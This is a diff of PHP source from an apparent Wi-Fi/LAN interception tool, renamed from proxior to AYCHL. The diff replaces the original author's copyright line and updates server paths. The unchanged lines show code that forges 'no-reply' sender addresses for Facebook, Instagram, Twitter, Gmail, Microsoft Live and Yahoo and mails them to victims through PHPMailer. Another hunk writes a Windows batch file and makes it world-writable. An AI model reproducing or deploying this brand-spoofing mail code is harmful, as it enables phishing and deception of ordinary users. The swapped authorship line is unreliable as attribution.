@@ -1,15 +1,15 @@
 <?php
 
 /*
-*  Copyright (c) 2019-2020 Barchampas Gerasimos <makindosxx@gmail.com>.
-*  proxior is a wifi interception.
+*  Copyright (c) 2019-2020 AYCH inc <tokeneconomy@eclipso.eu>.
+*  File LICENSE or "https://www.gnu.org/licenses/".
 *
-*  proxior is free software: you can redistribute it and/or modify
+*  AYCHL is proxy interception for lan and Wi-Fi. It is a free software: you can redistribute it and/or modify
 *  it under the terms of the GNU Affero General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
-*  proxior is distributed in the hope that it will be useful,
+*  AYCHL is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU Affero General Public License for more details.
@@ -306,7 +306,7 @@ transform: scale(2);
              .PHP_EOL .'exit';
          fwrite($hosts_ready, $lines_hosts_ready);
          fclose($hosts_ready);
-        chmod("/var/www/proxior/export/l_win.bat", 0777);
+        chmod("/var/www/aychl/export/l_win.bat", 0777);
             
              } // end of isset session site_ready
 
@@ -384,7 +384,7 @@ transform: scale(2);
         {
           $link = str_replace(".com_pc","",$str_link2);
           $link =   "no-reply" ."@" .$link .".com";
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/aychl/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
@@ -434,7 +434,7 @@ else if ($link == 'no-reply@facebook_tablet_mobile.com')
         {
           $link = str_replace(".com_tablet_mobile","",$str_link2);
           $link =   "no-reply" ."@" .$link .".com";
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/aychl/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
@@ -482,7 +482,7 @@ $mail->AddAddress("$email");
 
  else if ($link == 'no-reply@instagram.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/aychl/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
@@ -532,7 +532,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@twitter.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/aychl/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
@@ -580,7 +580,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@gmail.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/aychl/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
@@ -631,7 +631,7 @@ else if ($link == 'no-reply@https://login.live.com')
           $str_link2 = str_replace("https://","",$str_link);
           $str_link3 = str_replace(".com","",$str_link2);
           $link =   "no-reply" ."@" .$str_link3 .".com";
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/aychl/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
@@ -679,7 +679,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@yahoo.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/aychl/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
@@ -727,7 +727,7 @@ $mail->AddAddress("$email");
 
 else 
   {
-   require "/var/www/proxior/mail/PHPMailerAutoload.php";
+   require "/var/www/aychl/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
